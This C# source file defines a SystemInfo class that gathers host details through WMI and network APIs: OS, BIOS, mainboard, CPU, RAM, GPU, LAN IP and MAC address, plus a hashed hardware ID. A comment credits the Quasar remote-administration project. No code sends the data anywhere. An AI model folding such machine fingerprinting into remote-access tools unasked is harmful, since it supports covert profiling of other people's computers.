using System.Management;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Text.RegularExpressions;


#pragma warning disable CA1416 // Valider la compatibilité de la plateforme
// see https://github.com/quasar


namespace Win32ClassModule.System
{
    internal class SystemInfo
    {
        private string OsVersion;
        private string BiosManufacturer;
        private string MainboardName;
        private string CpuName;
        private int TotalPhysicalMemoryInMb;
        private string GpuName;
        private string LanIpAddress;
        private string MacAddress;
        private string HardwareID;
        private string TimeDate;

        public string GetOsVersion => OsVersion;
        public string GetBiosManufacturer => BiosManufacturer;
        public string GetMainboardName => MainboardName;
        public string GetCpuName => CpuName;
        public int GetTotalPhysicalMemoryInMb => TotalPhysicalMemoryInMb;
        public string GetGpuName => GpuName;
        public string GetLanIpAddress => LanIpAddress;
        public string GetMacAddress => MacAddress;
        public string GetTimeDate => TimeDate;

        public string GetHardwareID => HardwareID;


        public SystemInfo(string osVersion, string biosManufacturer, string mainboardName, string cpuName, 
            int totalPhysicalMemoryInMb, string gpuName, string lanIpAddress,
            string macAddress,string timeDate, string hardwareID)
        {
            OsVersion = osVersion;
            BiosManufacturer = biosManufacturer;
            MainboardName = mainboardName;
            CpuName = cpuName;
            TotalPhysicalMemoryInMb = totalPhysicalMemoryInMb;
            GpuName = gpuName;
            LanIpAddress = lanIpAddress;
            MacAddress = macAddress;
            TimeDate = timeDate;
            HardwareID = hardwareID;
        }

        public static SystemInfo? GetSystemInfo()
        {
            try
            {
                return new SystemInfo(
                    osVersion: GetOsVersion_(),
                    biosManufacturer: GetBiosManufacturer_(),
                    mainboardName: GetMainboardName_(),
                    cpuName: GetCpuName_(),
                    totalPhysicalMemoryInMb: GetTotalPhysicalMemoryInMb_(),
                    gpuName: GetGpuName_(),
                    lanIpAddress: GetLanIpAddress_(),
                    macAddress: GetMacAddress_(),
                    timeDate: DateTime.Now.ToString("dd/M/yyyy"),
            hardwareID: Cryptography.Sha265.ComputeSha256Hash(GetCpuName_() + GetMainboardName_() + GetBiosManufacturer_())
                    );
            }
            catch (Exception)
            {
                return null;
            }
        }

        private static string RemoveLastChars(string input, int amount = 2)
        {
            if (input.Length > amount)
                input = input.Remove(input.Length - amount);
            return input;
        }

        private static string GetOsVersion_()
        {
            try
            {
                return Environment.OSVersion.ToString();
            }
            catch (Exception)
            {

                return "Unknown";
            }
        }

        private static string GetBiosManufacturer_()
        {
            try
            {
                string biosIdentifier = string.Empty;
                string query = "SELECT * FROM Win32_BIOS";

                using (ManagementObjectSearcher searcher = new ManagementObjectSearcher(query))
                {
                    foreach (ManagementObject mObject in searcher.Get())
                    {
                        biosIdentifier = mObject["Manufacturer"].ToString();
                        break;
                    }
                }

                return (!string.IsNullOrEmpty(biosIdentifier)) ? biosIdentifier : "N/A";
            }
            catch
            {
            }

            return "Unknown";
        }

        private static string GetMainboardName_()
        {
            try
            {
                string mainboardIdentifier = string.Empty;
                string query = "SELECT * FROM Win32_BaseBoard";

                using (ManagementObjectSearcher searcher = new ManagementObjectSearcher(query))
                {
                    foreach (ManagementObject mObject in searcher.Get())
                    {
                        mainboardIdentifier = mObject["Manufacturer"].ToString() + " " + mObject["Product"].ToString();
                        break;
                    }
                }

                return (!string.IsNullOrEmpty(mainboardIdentifier)) ? mainboardIdentifier : "N/A";
            }
            catch
            {
            }

            return "Unknown";
        }

        private static string GetCpuName_()
        {
            try
            {
                string cpuName = string.Empty;
                string query = "SELECT * FROM Win32_Processor";

                using (ManagementObjectSearcher searcher = new ManagementObjectSearcher(query))
                {
                    foreach (ManagementObject mObject in searcher.Get())
                    {
                        cpuName += mObject["Name"].ToString() + "; ";
                    }
                }
                cpuName = RemoveLastChars(cpuName);

                return (!string.IsNullOrEmpty(cpuName)) ? cpuName : "N/A";
            }
            catch
            {
            }

            return "Unknown";
        }

        private static int GetTotalPhysicalMemoryInMb_()
        {
            try
            {
                int installedRAM = 0;
                string query = "Select * From Win32_ComputerSystem";

                using (ManagementObjectSearcher searcher = new ManagementObjectSearcher(query))
                {
                    foreach (ManagementObject mObject in searcher.Get())
                    {
                        double bytes = (Convert.ToDouble(mObject["TotalPhysicalMemory"]));
                        installedRAM = (int)(bytes / 1048576); // bytes to MB
                        break;
                    }
                }

                return installedRAM;
            }
            catch
            {
                return -1;
            }
        }

        private static string GetGpuName_()
        {
            try
            {
                string gpuName = string.Empty;
                string query = "SELECT * FROM Win32_DisplayConfiguration";

                using (ManagementObjectSearcher searcher = new ManagementObjectSearcher(query))
                {
                    foreach (ManagementObject mObject in searcher.Get())
                    {
                        gpuName += mObject["Description"].ToString() + "; ";
                    }
                }
                gpuName = RemoveLastChars(gpuName);

                return (!string.IsNullOrEmpty(gpuName)) ? gpuName : "N/A";
            }
            catch
            {
                return "Unknown";
            }
        }

        private static string GetLanIpAddress_()
        {
            // TODO: support multiple network interfaces
            foreach (NetworkInterface ni in NetworkInterface.GetAllNetworkInterfaces())
            {
                GatewayIPAddressInformation gatewayAddress = ni.GetIPProperties().GatewayAddresses.FirstOrDefault();
                if (gatewayAddress != null) //exclude virtual physical nic with no default gateway
                {
                    if (ni.NetworkInterfaceType == NetworkInterfaceType.Wireless80211 ||
                        ni.NetworkInterfaceType == NetworkInterfaceType.Ethernet &&
                        ni.OperationalStatus == OperationalStatus.Up)
                    {
                        foreach (UnicastIPAddressInformation ip in ni.GetIPProperties().UnicastAddresses)
                        {
                            if (ip.Address.AddressFamily != AddressFamily.InterNetwork ||
                                ip.AddressPreferredLifetime == UInt32.MaxValue) // exclude virtual network addresses
                                continue;

                            return ip.Address.ToString();
                        }
                    }
                }
            }

            return "-";
        }

        private static string GetFormattedMacAddress(string macAddress)
        {
            return (macAddress.Length != 12)
                ? "00:00:00:00:00:00"
                : Regex.Replace(macAddress, "(.{2})(.{2})(.{2})(.{2})(.{2})(.{2})", "$1:$2:$3:$4:$5:$6");
        }


        private static string GetMacAddress_()
        {
            foreach (NetworkInterface ni in NetworkInterface.GetAllNetworkInterfaces())
            {
                if (ni.NetworkInterfaceType == NetworkInterfaceType.Wireless80211 ||
                    ni.NetworkInterfaceType == NetworkInterfaceType.Ethernet &&
                    ni.OperationalStatus == OperationalStatus.Up)
                {
                    bool foundCorrect = false;
                    foreach (UnicastIPAddressInformation ip in ni.GetIPProperties().UnicastAddresses)
                    {
                        if (ip.Address.AddressFamily != AddressFamily.InterNetwork ||
                            ip.AddressPreferredLifetime == UInt32.MaxValue) // exclude virtual network addresses
                            continue;

                        foundCorrect = (ip.Address.ToString() == GetLanIpAddress_());
                    }

                    if (foundCorrect)
                        return GetFormattedMacAddress(ni.GetPhysicalAddress().ToString());
                }
            }

            return "-";
        }

    }
}
